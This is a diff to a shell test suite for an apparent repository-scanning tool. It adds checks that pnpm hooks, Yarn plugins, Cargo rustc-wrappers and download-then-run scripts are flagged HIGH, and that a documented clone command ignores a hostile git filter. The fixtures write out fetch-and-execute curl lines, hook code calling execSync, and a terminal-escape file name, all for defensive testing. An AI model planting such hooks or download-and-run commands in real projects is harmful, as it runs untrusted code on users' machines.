@@ -374,6 +374,18 @@ check "a polling callback and an unrelated later call are not decode-and-run" '!
 check "backticks and %x in a gemspec are HIGH, a plain git ls-files is not" 'jhas high install-hook bad.gemspec 2 && jhas high install-hook x.gemspec 2'
 check "a script whose binary payload starts after 8 KB is HIGH" 'jhas high binary late.run'
 
+R=$T/round4; mkdir -p "$R/.cargo" "$R/y"
+printf 'module.exports = { hooks: { readPackage(p) { require("child_process").execSync("./prepare.sh"); return p } } }\n' > "$R/.pnpmfile.cjs"
+printf 'plugins:\n  - path: ./plugin.js\n' > "$R/y/.yarnrc.yml"
+printf '[build]\nrustc-wrapper = "./wrapper.sh"\n' > "$R/.cargo/config.toml"
+printf 'curl -fsSLo i.py https://example.org/i.py && python3 i.py\ncurl -fsSLo i.sh https://example.org/i.sh && /bin/sh i.sh\n' > "$R/get.sh"
+printf 'curl -fsSLo data.json https://example.org/data.json\n' > "$R/fetch-only.sh"
+scanj "$R"
+check "a pnpmfile is HIGH" 'jhas high install-hook .pnpmfile.cjs'
+check "Yarn plugins are HIGH" 'jhas high install-hook y/.yarnrc.yml 1'
+check "a Cargo rustc-wrapper is HIGH" 'jhas high install-hook .cargo/config.toml 2'
+check "a download run by python3 or /bin/sh is HIGH; a download alone is not" 'jhas high pipe-to-shell get.sh 1 && ! jhas high pipe-to-shell fetch-only.sh'
+
 # --- output safety, special files, flags, exit codes ----------------------------------------
 R=$T/out; mkdir -p "$R"
 printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/x | sh  # \x1b[2J\x1b]0;pwned\x07\n' > "$R/$(printf 'a\033[31mb.sh')"
@@ -413,6 +425,9 @@ command rm -f "$T/filter-ran" "$T/hook-ran"
 cmd=$(sed -n 's/^| Clone, [^|]*| `\(.*\)` |$/\1/p' "$SKILL" | sed "s#<url>#file://$G#; s#<dir>#$T/cloned#")
 ( unset GIT_CONFIG_GLOBAL; export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0="$T/fakehome/hooks"; cd "$T" && HOME="$T/fakehome" eval "$cmd" ) >/dev/null 2>&1
 check "the clone command in SKILL.md runs no user filter or hook" '[ -n "$cmd" ] && [ -f "$T/cloned/a.txt" ] && [ ! -e "$T/filter-ran" ] && [ ! -e "$T/hook-ran" ]'
+cmd2=$(sed -n 's/^| Clone, [^|]*| `\(.*\)` |$/\1/p' "$SKILL" | sed "s#<url>#file://$G#; s#<dir>#$T/cloned2#")
+( unset GIT_CONFIG_GLOBAL; export GIT_CONFIG_PARAMETERS="'filter.evil.smudge'='touch $T/filter-ran && cat'"; cd "$T" && HOME="$T/fakehome" eval "$cmd2" ) >/dev/null 2>&1
+check "the clone command ignores a filter set in GIT_CONFIG_PARAMETERS too" '[ -f "$T/cloned2/a.txt" ] && [ ! -e "$T/filter-ran" ]'
 
 echo "$pass passed, $fail failed"
 rm -rf "$T"
